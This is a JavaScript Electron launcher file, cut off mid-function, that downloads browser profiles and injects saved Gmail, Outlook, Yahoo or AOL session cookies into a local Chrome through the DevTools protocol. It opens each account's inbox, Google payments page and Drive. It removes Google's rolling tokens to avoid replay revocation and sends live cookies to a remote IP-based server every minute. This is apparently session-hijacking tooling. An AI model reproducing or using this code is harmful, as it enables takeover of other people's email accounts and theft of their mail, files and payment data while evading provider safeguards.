const { app, BrowserWindow, protocol, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');
const { spawn } = require('child_process');
const extractZip = require('extract-zip');
const WebSocket = require('ws');
const crypto = require('crypto');


const FREE_MS_DOMAINS = new Set([
  'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
  'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
  'outlook.ca', 'hotmail.ca', 'live.ca',
  'outlook.co.za', 'hotmail.co.za', 'live.co.za',
  'outlook.com.au', 'hotmail.com.au', 'live.com.au',
  'outlook.fr', 'hotmail.fr', 'live.fr',
  'outlook.de', 'hotmail.de', 'live.de',
  'outlook.it', 'hotmail.it', 'live.it',
  'outlook.es', 'hotmail.es', 'live.es',
  'outlook.jp', 'hotmail.jp', 'live.jp',
  'outlook.com.br', 'hotmail.com.br', 'live.com.br',
  'msn.com', 'live.net'
]);

function resolveSmartPlatformUrls(domain, platform, email, cookies = []) {
  const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
  const p = (platform || '').toLowerCase().trim();
  const em = (email || '').toLowerCase().trim();

  // Check cookies for provider signatures if metadata is vague or missing
  let cookieProvider = null;
  if (Array.isArray(cookies) && cookies.length > 0) {
    for (const c of cookies) {
      const cdom = (c?.domain || '').toLowerCase();
      if (cdom.includes('google') || cdom.includes('gmail') || cdom.includes('youtube')) {
        cookieProvider = 'google';
        break;
      }
      if (cdom.includes('live.com') || cdom.includes('office.com') || cdom.includes('microsoft') || cdom.includes('outlook')) {
        cookieProvider = 'microsoft';
      }
      if (cdom.includes('yahoo')) {
        cookieProvider = 'yahoo';
      }
      if (cdom.includes('aol')) {
        cookieProvider = 'aol';
      }
    }
  }

  // 1. Google / Gmail / GSuite: 3 tabs
  if (p === 'google' || p === 'gmail' || p.includes('google') || p.includes('gmail') || p.includes('gsuite') || p.includes('workspace') || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com') || cookieProvider === 'google') {
    return [
      'https://mail.google.com/mail/u/0/#inbox',
      'https://myaccount.google.com/u/0/payments-and-subscriptions',
      'https://drive.google.com/drive/u/0/my-drive'
    ];
  }

  // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
  const isMsDomain = FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn') || d.includes('microsoft');
  if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain || cookieProvider === 'microsoft') {
    if (FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn')) {
      return ['https://outlook.live.com/mail/'];
    }
    // Custom domain / Office 365 / corporate paid account
    return ['https://outlook.office.com/mail/'];
  }

  // 3. Yahoo
  if (p === 'yahoo' || d.includes('yahoo') || d.includes('ymail') || cookieProvider === 'yahoo') {
    return ['https://mail.yahoo.com/'];
  }

  // 4. AOL
  if (p === 'aol' || d.includes('aol') || cookieProvider === 'aol') {
    return ['https://mail.aol.com/'];
  }

  // 5. Fallback for custom domain
  if (d) {
    return [`https://${d}`];
  }

  return [
    'https://mail.google.com/mail/u/0/#inbox',
    'https://myaccount.google.com/u/0/payments-and-subscriptions',
      'https://drive.google.com/drive/u/0/my-drive'
  ];
}

function getTabLabel(url, index) {
  if (!url) return `Tab ${index + 1}`;
  if (url.includes('mail.google.com')) return 'Gmail Inbox';
  if (url.includes('payments-and-subscriptions')) return 'Wallet & Subscriptions';
  if (url.includes('drive.google.com')) return 'Google Drive';
  if (url.includes('outlook.live.com')) return 'Outlook (Free)';
  if (url.includes('outlook.office.com')) return 'Outlook (Office 365)';
  if (url.includes('mail.yahoo.com')) return 'Yahoo Mail';
  if (url.includes('mail.aol.com')) return 'AOL Mail';
  return `Tab ${index + 1}`;
}

let API_BASE = 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';
const SESSION_DIR = path.join(app.getPath('temp'), 'webfixx-sessions');
const CONFIG_FILE = path.join(SESSION_DIR, 'launcher-config.json');

let activeSyncTimer = null;
let activeSessionContext = null;

function getLauncherKey(urlLauncherKey) {
  let savedConfig = {};
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      savedConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
    }
  } catch (_) {}

  if (urlLauncherKey && typeof urlLauncherKey === 'string' && urlLauncherKey.trim()) {
    const key = urlLauncherKey.trim();
    savedConfig.launcherKey = key;
    try {
      if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
      fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedConfig, null, 2));
    } catch (_) {}
    return key;
  }

  if (savedConfig.launcherKey) {
    return savedConfig.launcherKey;
  }

  const generatedKey = `LK-${crypto.randomBytes(8).toString('hex').toUpperCase()}`;
  savedConfig.launcherKey = generatedKey;
  try {
    if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(savedConfig, null, 2));
  } catch (_) {}
  return generatedKey;
}

async function syncCookiesToServer(debugPort, sessionCtx) {
  if (!sessionCtx || !sessionCtx.isGoogleSession || !debugPort) return;
  try {
    const httpBase = `http://127.0.0.1:${debugPort}`;
    const resp = await fetch(`${httpBase}/json`).catch(() => null);
    if (!resp || !resp.ok) return;
    const targets = await resp.json().catch(() => []);
    const page = Array.isArray(targets) ? targets.find(t => t.type === 'page') : null;
    if (!page || !page.webSocketDebuggerUrl) return;

    const ws = new WebSocket(page.webSocketDebuggerUrl, { handshakeTimeout: 4000 });
    await new Promise((resolve, reject) => {
      ws.on('open', resolve);
      ws.on('error', reject);
    });

    const getCookiesMsg = {
      id: 9999,
      method: 'Network.getCookies',
      params: {
        urls: [
          'https://mail.google.com',
          'https://myaccount.google.com',
          'https://drive.google.com',
          'https://accounts.google.com'
        ]
      }
    };

    const cookieResult = await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        try { ws.close(); } catch (_) {}
        reject(new Error('CDP timeout for Network.getCookies'));
      }, 8000);

      ws.on('message', (data) => {
        try {
          const msg = JSON.parse(data.toString());
          if (msg.id === 9999) {
            clearTimeout(timeout);
            try { ws.close(); } catch (_) {}
            if (msg.error) reject(new Error(msg.error.message));
            else resolve(msg.result);
          }
        } catch (_) {}
      });
      ws.send(JSON.stringify(getCookiesMsg));
    });

    const liveCookies = cookieResult?.cookies || [];
    if (liveCookies.length > 0) {
      const base = String(sessionCtx.apiBase || API_BASE || '').trim().replace(/\/+$/, '');
      const payload = {
        browserId: sessionCtx.browserId,
        token: sessionCtx.token,
        launcherKey: sessionCtx.launcherKey,
        cookies: liveCookies
      };

      let syncRes = await fetch(`${base}/electron/sync-cookies`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => null);

      if (!syncRes || (syncRes.status === 404 && !base.endsWith('/api'))) {
        syncRes = await fetch(`${base}/api/electron/sync-cookies`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(() => null);
      }

      if (syncRes && syncRes.ok) {
        appendLog(`[INFO] [Pillar 2] Synced ${liveCookies.length} live cookies to server.`);
      }
    }
  } catch (syncErr) {
    console.warn(`[DEBUG] syncCookiesToServer notice: ${syncErr.message}`);
  }
}

const CHROME_PATHS = [
  { name: 'Chrome', path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' },
  { name: 'Chrome', path: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe' },
  { name: 'Edge', path: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe' },
  { name: 'Edge', path: 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe' },
  { name: 'Brave', path: 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe' },
  { name: 'Brave', path: 'C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe' },
  { name: 'Chrome', path: 'C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe' },
  { name: 'ChromeCanary', path: 'C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome SxS\\Application\\chrome.exe' },
];

let mainWindow = null;
let downloadAbortController = null;
let lastSessionParams = null;

function findBrowser() {
  const username = process.env.USERNAME || '';
  for (const entry of CHROME_PATHS) {
    const resolvedPath = entry.path.replace('%USERNAME%', username);
    try {
      if (fs.existsSync(resolvedPath)) {
        return { name: entry.name, path: resolvedPath };
      }
    } catch (_) {}
  }
  return null;
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 440,
    height: 360,
    resizable: false,
    frame: false,
    center: true,
    show: false,
    backgroundColor: '#111827',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  mainWindow.loadFile(path.join(__dirname, 'renderer', 'index.html'));
  mainWindow.once('ready-to-show', () => mainWindow.show());
}


const LOG_FILE = path.join(SESSION_DIR, 'launcher-debug.log');

function appendLog(line) {
  const ts = new Date().toLocaleTimeString();
  const entry = `[${ts}] ${line}`;
  console.log(entry);
  try {
    if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
    fs.appendFileSync(LOG_FILE, entry + '\n');
  } catch (_) {}
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send('session-log', { text: entry, line, ts });
  }
}

function sendStatus(status, detail) {
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send('session-status', { status, detail });
  }
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function downloadFile(url, destPath) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const mod = parsed.protocol === 'https:' ? https : http;
    downloadAbortController = new AbortController();

    const makeRequest = (targetUrl, redirectCount = 0) => {
      const req = mod.get(
        targetUrl,
        {
          signal: downloadAbortController.signal,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 WebFixxLauncher/1.0',
          },
        },
        (res) => {
          if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
            if (redirectCount >= 10) {
              reject(new Error(`Too many redirects (${redirectCount}) while downloading ${targetUrl}`));
              return;
            }
            const next = new URL(res.headers.location, targetUrl).toString();
            makeRequest(next, redirectCount + 1);
            return;
          }

          if (res.statusCode !== 200) {
            let body = '';
            res.on('data', (c) => (body += c.toString()));
            res.on('end', () => {
              const confirmMatch = body.match(/confirm=([0-9A-Za-z]+)/);
              if (confirmMatch && targetUrl.includes('drive.google.com')) {
                const confirmUrl = targetUrl + (targetUrl.includes('?') ? '&' : '?') + `confirm=${confirmMatch[1]}`;
                makeRequest(confirmUrl, redirectCount + 1);
                return;
              }
              reject(new Error(`Download failed with status ${res.statusCode} for ${targetUrl}`));
            });
            return;
          }

          const total = parseInt(res.headers['content-length'] || '0', 10);
          let downloaded = 0;
          const fileStream = fs.createWriteStream(destPath);
          res.on('data', (chunk) => {
            downloaded += chunk.length;
            fileStream.write(chunk);
            if (total > 0) {
              const pct = Math.round((downloaded / total) * 100);
              sendStatus('downloading', `Downloading profile... ${pct}%`);
            } else {
              sendStatus('downloading', `Downloading profile... ${Math.round(downloaded / 1024)} KB`);
            }
          });
          res.on('end', () => {
            fileStream.end();
          });
          fileStream.on('finish', () => resolve(destPath));
          fileStream.on('error', reject);
        }
      );
      req.on('error', reject);
    };

    makeRequest(url);
  });
}

async function launchSession(browserId, token, launcherKeyParam, usernameParam) {
  const launcherKey = getLauncherKey(launcherKeyParam);
  const username = usernameParam || process.env.USERNAME || '';
  lastSessionParams = { browserId, token, launcherKey, username, api: API_BASE };
  let chromeProcess = null;
  let wsClient = null;
  let browserWsClient = null;

  try {
    sendStatus('connecting', 'Validating session...');
    appendLog(`[INFO] Validating session for ${browserId} (launcherKey: ${launcherKey})...`);

    let base = String(API_BASE || '').trim().replace(/\/+$/, '');
    const requestPayload = { browserId, token, launcherKey, username };

    let validateRes = await fetch(`${base}/electron/session-data`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(requestPayload),
    });

    if (validateRes.status === 404 && !base.endsWith('/api')) {
      validateRes = await fetch(`${base}/api/electron/session-data`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestPayload),
      });
    }

    if (!validateRes.ok) {
      const err = await validateRes.json().catch(() => ({}));
      if (validateRes.status === 403) {
        sendStatus('error', err.error || 'Access Denied: This session is locked to a different launcher installation.');
        appendLog(`[SECURITY] 403 Forbidden: ${err.error}`);
        return;
      }
      sendStatus('error', err.error || 'Failed to get session data');
      return;
    }

    const { downloadUrl, platformUrl, platformUrls, email, domain, platform, cookieJSON, accountCookieJSON, driveCookieJSON, browserIdentity } = await validateRes.json();

    if (!downloadUrl) {
      sendStatus('error', 'No saved browser profile found for this session');
      return;
    }

    // ── Platform Check: Is this a Google/Gmail session? ──────────────
    const dCheck = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
    const pCheck = (platform || '').toLowerCase().trim();
    const emCheck = (email || '').toLowerCase().trim();
    let isGoogleSession = pCheck === 'google' || pCheck === 'gmail' || pCheck.includes('google') || pCheck.includes('gmail') || pCheck.includes('gsuite') || pCheck.includes('workspace') || dCheck.includes('google') || dCheck.includes('gmail') || emCheck.endsWith('@gmail.com') || emCheck.endsWith('@googlemail.com');
    if (!isGoogleSession && (Array.isArray(driveCookieJSON) || Array.isArray(cookieJSON))) {
      const probeList = (Array.isArray(driveCookieJSON) && driveCookieJSON.length > 0) ? driveCookieJSON : (cookieJSON || []);
      for (const c of probeList) {
        const cdom = (c?.domain || '').toLowerCase();
        if (cdom.includes('google') || cdom.includes('gmail') || cdom.includes('youtube')) {
          isGoogleSession = true;
          break;
        }
      }
    }

    // For Google: use an isolated instance directory per launch to eliminate EBUSY lockfile collisions
    // For Outlook / other platforms: preserve existing fixed destDir path 100% as-is
    const destDir = isGoogleSession
      ? path.join(SESSION_DIR, browserId, `session_${Date.now()}`)
      : path.join(SESSION_DIR, browserId);
    if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });

    const zipPath = path.join(SESSION_DIR, `${browserId}.zip`);
    sendStatus('downloading', 'Starting download...');
    appendLog(`[INFO] Downloading session profile archive...`);

    await downloadFile(downloadUrl + (downloadUrl.includes('?') ? '&' : '?') + 'confirm=t', zipPath);

    const zipStat = fs.statSync(zipPath);
    if (zipStat.size < 100) {
      const content = fs.readFileSync(zipPath, 'utf-8');
      if (content.includes('<html') || content.includes('<!DOCTYPE')) {
        fs.unlinkSync(zipPath);
        sendStatus('error', 'Google Drive returned a web page instead of the file. Try again or download manually.');
        return;
      }
    }

    const zipHeader = Buffer.alloc(4);
    const fd = fs.openSync(zipPath, 'r');
    fs.readSync(fd, zipHeader, 0, 4, 0);
    fs.closeSync(fd);
    if (zipHeader.toString('hex') !== '504b0304') {
      fs.unlinkSync(zipPath);
      sendStatus('error', 'Downloaded file is not a valid ZIP. Google Drive may require browser verification.');
      return;
    }

    sendStatus('extracting', 'Extracting browser profile...');
    appendLog(`[INFO] Profile download finished. Extracting to ${destDir}...`);

    try {
      await extractZip(zipPath, { dir: destDir });
    } catch (extractErr) {
      if (!isGoogleSession) {
        // Outlook behavior preserved 100%
        const code = extractErr.code || '';
        const msg = (extractErr.message || '').toLowerCase();
        if (code === 'EPERM' || code === 'EBUSY' || code === 'UNKNOWN' ||
            msg.includes('eperm') || msg.includes('ebusy') || msg.includes('open')) {
          sendStatus('error', 'This session is already open in another browser window. Close it first, then retry.');
          return;
        }
        sendStatus('error', `Failed to extract profile: ${extractErr.message}`);
        return;
      }
      appendLog(`[WARN] Notice during Google profile extraction: ${extractErr.message}. Continuing with session initialization...`);
    }
    fs.unlinkSync(zipPath);

    // ── Google Session Resilience (ONLY for Google / Gmail) ───────────
    if (isGoogleSession) {
      appendLog('[INFO] Applying Google session resilience: removing stale VPS lock and port artifacts...');
      const staleArtifacts = [
        'DevToolsActivePort',
        'lockfile',
        'SingletonLock',
        'SingletonSocket',
        'SingletonCookie',
        'BrowserMetrics-spare.pma',
        'CrashpadMetrics-active.pma',
      ];
      for (const f of staleArtifacts) {
        const p = path.join(destDir, f);
        try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
      }

      // Remove machine-bound DPAPI cookie files so local Chrome starts with a clean SQLite store
      // and relies 100% on plaintext CDP cookie injection (proven to survive across all devices).
      const machineBoundFiles = [
        path.join(destDir, 'Default', 'Network', 'Cookies'),
        path.join(destDir, 'Default', 'Network', 'Cookies-journal'),
        path.join(destDir, 'Default', 'Cookies'),
        path.join(destDir, 'Default', 'Cookies-journal'),
      ];
      for (const p of machineBoundFiles) {
        try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
      }
    }

    const browser = findBrowser();
    if (!browser) {
      sendStatus('error', 'No supported browser found (Chrome, Edge, or Brave)');
      return;
    }

    // ── Waterfall Cookie Selection System ──────────────────────────────
    // 1. Level 1: driveCookieJSON (freshest, comprehensive Google session state from all tabs)
    // 2. Level 2: accountCookieJSON (Google account tab session state fallback)
    // 3. Level 3: cookieJSON (standard session cookies fallback; primary for Microsoft/Outlook/Yahoo/AOL)
    let allCookiesToInject = [];
    let cookieCandidateName = '';

    if (Array.isArray(driveCookieJSON) && driveCookieJSON.length > 0) {
      allCookiesToInject = [...driveCookieJSON];
      cookieCandidateName = 'driveCookieJSON';
      appendLog(`[INFO] [WATERFALL 1/3] Using comprehensive driveCookieJSON (${driveCookieJSON.length} cookies)...`);
    } else if (Array.isArray(accountCookieJSON) && accountCookieJSON.length > 0) {
      allCookiesToInject = [...accountCookieJSON];
      cookieCandidateName = 'accountCookieJSON';
      appendLog(`[INFO] [WATERFALL 2/3] driveCookieJSON absent. Falling back to accountCookieJSON (${accountCookieJSON.length} cookies)...`);
    } else if (Array.isArray(cookieJSON) && cookieJSON.length > 0) {
      allCookiesToInject = [...cookieJSON];
      cookieCandidateName = 'cookieJSON';
      appendLog(`[INFO] [WATERFALL 3/3] Falling back to standard cookieJSON (${cookieJSON.length} cookies)...`);
    } else {
      appendLog(`[WARN] [WATERFALL] No cookies found in session data (driveCookieJSON, accountCookieJSON, cookieJSON all empty).`);
    }

    // ── Pillar 1: Dynamic Rolling-Token Sanitization (Strictly Google-Only) ──
    if (isGoogleSession && allCookiesToInject.length > 0) {
      const ROLLING_TOKEN_NAMES = new Set([
        'SIDCC',
        '__Secure-1PSIDCC',
        '__Secure-3PSIDCC',
        '__Secure-1PSIDTS',
        '__Secure-3PSIDTS'
      ]);

      const initialCount = allCookiesToInject.length;
      allCookiesToInject = allCookiesToInject.filter(c => {
        if (!c || !c.name) return false;
        if (ROLLING_TOKEN_NAMES.has(c.name)) return false;
        if (c.name === 'OSID' && c.domain && !c.domain.includes('mail.google.com')) return false;
        return true;
      });

      const strippedCount = initialCount - allCookiesToInject.length;
      appendLog(`[INFO] [Pillar 1] Sanitized Google rolling tokens: stripped ${strippedCount} stale counter tokens (SIDCC/PSIDTS) so Google generates fresh local tokens without triggering replay counter revocation.`);
    }

    if (allCookiesToInject.length > 0) {
      // ALWAYS inject cookieJSON via CDP — never trust the profile's cookie DB.
      // The profile zip is created by Chromium on the Linux server; its cookies are
      // encrypted with a machine-bound os_crypt key that Windows Chrome on this machine
      // cannot decrypt, so "loading cookies from the profile" opens Gmail's sign-in
      // page even though Default/Network/Cookies exists. CDP Network.setCookie writes
      // plaintext values straight into the running instance (proven 08/19 launcher
      // behavior). browserIdentity overrides are intentionally not applied here —
      // they were never present in the build proven to work.
      const chromeArgs = [
        `--user-data-dir=${destDir}`,
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-sync',
        '--disable-popup-blocking',
        '--remote-debugging-port=0',
        'about:blank',
      ];

      if (isGoogleSession) {
        const portFileToClean = path.join(destDir, 'DevToolsActivePort');
        try { if (fs.existsSync(portFileToClean)) fs.unlinkSync(portFileToClean); } catch (_) {}
      }

      sendStatus('launching', `Opening ${domain || 'session'} in ${browser.name}...`);

      chromeProcess = spawn(browser.path, chromeArgs, {
        detached: true,
        stdio: 'ignore',
      });

      const portFile = path.join(destDir, 'DevToolsActivePort');
      await sleep(2000);

        let debugPort = null;
        for (let attempt = 0; attempt < 20; attempt++) {
          try {
            if (fs.existsSync(portFile)) {
              const content = fs.readFileSync(portFile, 'utf-8').trim();
              const lines = content.split('\n');
              if (lines.length >= 2) {
                debugPort = lines[0];
                break;
              }
            }
          } catch (_) {}
          await sleep(500);
        }

        if (!debugPort) {
          sendStatus('error', 'Failed to connect to Chrome DevTools');
          if (chromeProcess) chromeProcess.kill();
          return;
        }

        const httpBase = `http://127.0.0.1:${debugPort}`;
        let pageWsUrl = null;
        let browserWsUrl = null;

        for (let i = 0; i < 20; i++) {
          try {
            if (!browserWsUrl) {
              const vResp = await fetch(`${httpBase}/json/version`);
              if (vResp.ok) {
                const vJson = await vResp.json();
                if (vJson && vJson.webSocketDebuggerUrl) {
                  browserWsUrl = vJson.webSocketDebuggerUrl;
                }
              }
            }
            if (!pageWsUrl) {
              const resp = await fetch(`${httpBase}/json`);
              if (resp.ok) {
                const targets = await resp.json();
                const page = targets.find(t => t.type === 'page');
                if (page && page.webSocketDebuggerUrl) {
                  pageWsUrl = page.webSocketDebuggerUrl;
                }
              }
            }
            if (browserWsUrl && pageWsUrl) break;
          } catch (_) {}
          await sleep(500);
        }

        if (!pageWsUrl) {
          sendStatus('error', 'Failed to find Chrome page target');
          if (chromeProcess) chromeProcess.kill();
          return;
        }

        await new Promise((resolve, reject) => {
          wsClient = new WebSocket(pageWsUrl, { handshakeTimeout: 5000 });
          wsClient.on('open', resolve);
          wsClient.on('error', reject);
        });

        if (browserWsUrl) {
          try {
            await new Promise((resolve, reject) => {
              browserWsClient = new WebSocket(browserWsUrl, { handshakeTimeout: 5000 });
              browserWsClient.on('open', resolve);
              browserWsClient.on('error', reject);
            });
          } catch (bConnErr) {
            console.warn('Notice: Browser WebSocket connection failed, will use fallback:', bConnErr.message);
          }
        }

        let msgId = 1;
        const sendCDP = (method, params = {}, timeoutMs = 30000) => {
          return new Promise((resolve, reject) => {
            const id = msgId++;
            const timeout = setTimeout(() => reject(new Error(`CDP timeout: ${method}`)), timeoutMs);
            const handler = (data) => {
              try {
                const msg = JSON.parse(data.toString());
                if (msg.id === id) {
                  clearTimeout(timeout);
                  wsClient.off('message', handler);
                  if (msg.error) reject(new Error(msg.error.message));
                  else resolve(msg.result);
                }
              } catch (_) {}
            };
            wsClient.on('message', handler);
            wsClient.send(JSON.stringify({ id, method, params }));
          });
        };

        let browserMsgId = 1000;
        const sendBrowserCDP = (method, params = {}, timeoutMs = 15000) => {
          if (!browserWsClient || browserWsClient.readyState !== WebSocket.OPEN) {
            return Promise.reject(new Error('Browser WebSocket not open'));
          }
          return new Promise((resolve, reject) => {
            const id = browserMsgId++;
            const timeout = setTimeout(() => reject(new Error(`Browser CDP timeout: ${method}`)), timeoutMs);
            const handler = (data) => {
              try {
                const msg = JSON.parse(data.toString());
                if (msg.id === id) {
                  clearTimeout(timeout);
                  browserWsClient.off('message', handler);
                  if (msg.error) reject(new Error(msg.error.message));
                  else resolve(msg.result);
                }
              } catch (_) {}
            };
            browserWsClient.on('message', handler);
            browserWsClient.send(JSON.stringify({ id, method, params }));
          });
        };

        appendLog(`[INFO] Ingesting ${allCookiesToInject.length} cookies from ${cookieCandidateName} into browser jar...`);
        for (const c of allCookiesToInject) {
          appendLog(`[COOKIE] ${c.domain} | ${c.name} (path: ${c.path || '/'})`);
        }

        let cookiesSet = 0;
        let cookiesFailed = 0;

        // Fast batch cookie injection via Network.setCookies if available
        const cdpCookiesList = allCookiesToInject.map(cookie => {
          const cdpCookie = {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path || '/',
            secure: cookie.secure || (cookie.sameSite || '').toLowerCase() === 'none',
            httpOnly: cookie.httpOnly || false,
          };
          if (cookie.expires && cookie.expires > 0) {
            cdpCookie.expires = cookie.expires;
          }
          const ss = (cookie.sameSite || '').toLowerCase();
          if (ss === 'none') cdpCookie.sameSite = 'None';
          else if (ss === 'strict') cdpCookie.sameSite = 'Strict';
          else if (ss === 'lax') cdpCookie.sameSite = 'Lax';
          return cdpCookie;
        });

        let batchSuccess = false;
        if (cdpCookiesList.length > 0) {
          try {
            await sendCDP('Network.setCookies', { cookies: cdpCookiesList }, 10000);
            cookiesSet = cdpCookiesList.length;
            batchSuccess = true;
          } catch (_) {
            batchSuccess = false;
          }
        }

        if (!batchSuccess) {
          for (const cdpCookie of cdpCookiesList) {
            try {
              const result = await sendCDP('Network.setCookie', cdpCookie, 3000);
              if (result && result.success) cookiesSet++;
              else cookiesFailed++;
            } catch (e) {
              cookiesFailed++;
            }
          }
        }

        appendLog(`[INFO] [Pillar 4] Cookie injection complete (${cookiesSet} set). Pausing 3s for Chrome network jar digestion...`);
        await sleep(3000);

        // Determine all target URLs to automatically open in Chrome
        let targetUrls = [];
        if (Array.isArray(platformUrls) && platformUrls.length > 1) {
          targetUrls = platformUrls;
        } else {
          targetUrls = resolveSmartPlatformUrls(domain, platform, email, allCookiesToInject);
        }
        if (!targetUrls || targetUrls.length === 0) {
          targetUrls = [
            'https://mail.google.com/mail/u/0/#inbox',
            'https://myaccount.google.com/u/0/payments-and-subscriptions',
      'https://drive.google.com/drive/u/0/my-drive'
          ];
        }

        // Unref chrome process early so an error during tab creation never terminates Chrome
        if (chromeProcess) {
          chromeProcess.unref();
          chromeProcess = null;
        }

        // Tab 1: Navigate existing page
        const firstLabel = getTabLabel(targetUrls[0], 0);
        appendLog(`[NAV] Tab 1: Navigating to ${targetUrls[0]}...`);
        sendStatus('launching', targetUrls.length > 1
          ? `Opening Tab 1/${targetUrls.length} (${firstLabel}) in ${browser.name}...`
          : `Opening ${firstLabel} in ${browser.name}...`
        );
        try {
          await sendCDP('Page.navigate', { url: targetUrls[0] }, 30000);
        } catch (navErr) {
          console.warn(`Page.navigate notice for ${targetUrls[0]}: ${navErr.message}`);
        }

        // Dedicated foreground window for Tab 1
        if (targetUrls.length > 1) {
          const warmUpWait = isGoogleSession ? 10000 : 6000;
          appendLog(`[INFO] [Pillar 4] Dedicated foreground window for Tab 1 (${warmUpWait / 1000}s)...`);
          await sleep(warmUpWait);
        }

        // Tabs 2+: Open additional tabs sequentially via DevTools HTTP PUT /json/new, with CDP fallbacks
        for (let i = 1; i < targetUrls.length; i++) {
          const tabUrl = targetUrls[i];
          const tabLabel = getTabLabel(tabUrl, i);
          sendStatus('launching', `Opening Tab ${i + 1}/${targetUrls.length} (${tabLabel})...`);
          appendLog(`[NAV] Opening Tab ${i + 1}/${targetUrls.length} (${tabLabel}): ${tabUrl}`);
          let opened = false;

          // 1. Direct Chrome DevTools HTTP PUT endpoint (most reliable native Chrome tab creation)
          try {
            const newRes = await fetch(`${httpBase}/json/new?${encodeURIComponent(tabUrl)}`, { method: 'PUT' });
            if (newRes.ok) {
              opened = true;
            }
          } catch (httpErr) {
            console.warn(`PUT /json/new notice for ${tabUrl}: ${httpErr.message}`);
          }

          // 2. Browser CDP Target.createTarget fallback
          if (!opened && browserWsClient && browserWsClient.readyState === WebSocket.OPEN) {
            try {
              await sendBrowserCDP('Target.createTarget', { url: tabUrl });
              opened = true;
            } catch (bErr) {
              console.warn(`Browser Target.createTarget notice for ${tabUrl}: ${bErr.message}`);
            }
          }

          // 3. Page WebSocket evaluate fallback
          if (!opened) {
            try {
              await sendCDP('Runtime.evaluate', {
                expression: `window.open(${JSON.stringify(tabUrl)}, '_blank')`
              }, 5000);
              opened = true;
            } catch (evalErr) {
              console.error(`Failed to open tab ${tabUrl}: ${evalErr.message}`);
            }
          }

          // Stagger each tab creation by 4 seconds so Chrome can negotiate SSO without throttling
          await sleep(4000);
        }

        // Bring Tab 1 (Gmail Inbox) back to front so it remains the active foreground tab
        try {
          await sendCDP('Page.bringToFront', {}, 5000);

          // Anti-Hang Auto-Reload Guard: Verify Tab 1 DOM is responsive
          if (isGoogleSession) {
            await sleep(1500);
            const readyStateRes = await sendCDP('Runtime.evaluate', {
              expression: 'document.readyState'
            }, 4000).catch(() => null);

            const readyState = readyStateRes?.result?.value;
            appendLog(`[INFO] Tab 1 readyState: ${readyState || 'unknown'}`);
            if (readyState && readyState !== 'complete') {
              appendLog('[INFO] Tab 1 load pending after multi-tab sequence; issuing gentle refresh...');
              await sendCDP('Page.reload', { ignoreCache: false }, 5000).catch(() => {});
            }
          }
        } catch (_) {}

        await sleep(2000);

        if (isGoogleSession && debugPort) {
          activeSessionContext = {
            browserId,
            token,
            launcherKey,
            apiBase: API_BASE,
            isGoogleSession: true,
            debugPort
          };

          if (activeSyncTimer) clearInterval(activeSyncTimer);

          // Initial sync 15 seconds after tabs open to capture fresh local tokens
          setTimeout(() => {
            syncCookiesToServer(debugPort, activeSessionContext);
          }, 15000);

          // Recurring sync every 60 seconds
          activeSyncTimer = setInterval(async () => {
            try {
              const chk = await fetch(`http://127.0.0.1:${debugPort}/json/version`).catch(() => null);
              if (!chk || !chk.ok) {
                clearInterval(activeSyncTimer);
                activeSyncTimer = null;
                return;
              }
              await syncCookiesToServer(debugPort, activeSessionContext);
            } catch (_) {
              clearInterval(activeSyncTimer);
              activeSyncTimer = null;
            }
          }, 60000);
        }

        if (wsClient && wsClient.readyState === WebSocket.OPEN) wsClient.close();
        wsClient = null;
